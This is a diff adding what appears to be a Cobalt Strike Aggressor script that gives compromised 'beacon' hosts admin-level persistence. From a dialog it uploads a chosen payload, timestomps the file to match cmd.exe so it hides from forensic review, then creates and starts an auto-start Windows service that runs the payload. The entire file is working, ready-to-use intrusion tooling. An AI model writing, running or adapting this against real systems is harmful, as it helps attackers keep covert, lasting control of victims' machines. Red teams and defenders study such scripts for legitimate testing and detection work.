@@ -1,0 +1,47 @@
+#Admin Level Custom Service EXE Persistence
+#Author: @Qu1nn
+#Runs as elevated user/SYSTEM for the selected beacon
+
+sub persistCustomService  {
+	$bid = $1;
+	$dialog = dialog("Admin Level Custom Service EXE Persistence", %(servicename => "Custom Service Name..", display => "Display Name for Custom Service..", description => "Description for Custom Service..", targetpath => "Target Path..", payloadfile => "Select Payload.."), lambda({
+		if ("$3['servicename']" ismatch 'Custom Service Name..' || "$3['targetpath']" ismatch 'Target Path..' || "$3['display']" ismatch 'Display Name for Custom Service..' || "$3['description']" ismatch 'Description for Custom Service..' || "$3['payloadfile']" ismatch 'Select Payload..') {
+			berror($bid, "\c4Please enter a valid Custom Service Name, Target Path, Display Name, Description and Payload File.");
+			break;
+		}
+		else {
+			bcd($bid, $3['targetpath']);
+			bupload($bid, $3['payloadfile']);
+			btimestomp($bid, "$3['payloadfile']", "C:\\Windows\\System32\\cmd.exe");
+			bshell($bid, 'sc delete '.$3['servicename'].'');
+			bshell($bid, 'sc create '.$3['servicename'].' binpath= "'.$3['targetpath'].split("/",$3['payloadfile'])[-1].'" error= ignore start= auto DisplayName= "'.$3['display'].'"');
+			bshell($bid, 'sc description '.$3['servicename'].' "'.$3['description'].'"');
+			bshell($bid, 'sc start '.$3['servicename'].'');
+		}
+	}));
+	dialog_description($dialog, "Generates a Custom Service for Admin Level persistence on selected beacon. **Only Service EXE Payloads should be used**");
+	
+	drow_text($dialog, "servicename",  "Custom Service Name:");
+	drow_text($dialog, "display", "Display Name for Custom Service:");
+	drow_text($dialog, "description", "Description for Custom Service:");
+	drow_text($dialog, "targetpath", "Target/Bin Path:");
+	drow_file($dialog, "payloadfile", "Payload:");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+popup beacon_bottom {
+	item "Admin Level Custom Service EXE Persistence" {
+		local ('$bid');
+		foreach $bid ($1) {
+			if (-isadmin $bid) {
+				persistCustomService($bid);
+			}
+			else {
+				berror($1, "\c4Persistence Requires Admin Level Privileges");
+			}
+		}
+	}
+}
